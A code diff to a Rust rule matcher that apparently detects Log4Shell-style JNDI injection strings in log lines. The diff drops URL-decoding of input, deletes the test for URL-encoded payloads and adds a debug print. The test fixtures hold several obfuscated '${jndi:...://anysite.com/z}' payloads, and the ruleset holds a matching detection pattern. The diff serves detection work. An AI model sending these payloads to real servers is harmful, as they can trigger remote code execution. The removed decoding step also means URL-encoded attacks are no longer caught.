@@ -1,5 +1,3 @@
-use urlencoding::decode;
-
 mod matcher;
 use matcher::Matcher;
 pub struct Ruleset {
@@ -15,7 +13,7 @@ impl Ruleset {
 
     pub fn match_rules(&self, line: &str) -> bool {
         let mut matchers: Vec<Matcher> = self.rules.iter().map(|rule| Matcher::new(rule)).collect();
-        let line = decode(line).map_or(line.to_lowercase(), |decoded| decoded.to_lowercase());
+        let line = line.to_lowercase();
 
         for c in line.chars() {
             let is_match = matchers.iter_mut().any(|matcher| {
@@ -118,6 +116,10 @@ mod tests {
             "${${::-j}${::-n}${::-d}${::-i}:${::-n}${::-d}${::-s}://anysite.com/z}"
         ];
 
+        dbg!(lines
+            .iter()
+            .filter(|line| !ruleset.match_rules(line))
+            .collect::<Vec<&&str>>());
         assert!(lines.iter().all(|line| ruleset.match_rules(line)));
     }
 
@@ -130,17 +132,6 @@ mod tests {
             "${${lower:j}ndi:${lower:c}${lower:o}r${lower:b}a://anysite.com/z}",
             "${${upper:j}ndi:${upper:c}${upper:o}R${lower:b}a://anysite.com/z}",
             "${${::-j}${::-n}${::-d}${::-i}:${::-c}${::-o}${::-r}${::-b}:${::-a}://anysite.com/z}"
-        ];
-
-        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
-    }
-
-    #[test]
-    fn detects_url_encoded_lines() {
-        let ruleset = Ruleset::new(&mut "${jndi:ldap://".lines());
-        let lines = vec![
-            "%24%7Bjndi%3Aldap%3A%2F%2Fanysite.com%2Fz%7D",
-            "%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3A%24%7B%3A%3A-l%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-a%7D%24%7B%3A%3A-p%7D%3A%2F%2Fanysite.com%2Fz%7D",
         ];
 
         assert!(lines.iter().all(|line| ruleset.match_rules(line)));
